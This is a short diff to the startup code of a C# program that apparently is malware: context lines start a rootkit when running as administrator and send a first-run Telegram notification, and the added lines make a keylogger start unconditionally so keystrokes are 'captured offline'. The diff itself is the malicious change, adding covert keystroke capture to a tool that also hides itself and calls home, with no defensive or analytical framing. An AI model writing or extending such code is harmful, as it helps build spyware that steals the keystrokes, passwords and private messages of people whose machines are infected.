@@ -375,6 +375,9 @@ partial class Program
         if (Config.EnableRootkit && admin)
             Rootkit.Start();
 
+        // Keylogger: always running from startup so logs are captured offline
+        KeyloggerFeature.Start();
+
         // First-run Telegram notification — fires async, never blocks startup
         TelegramNotifier.NotifyAsync();
 
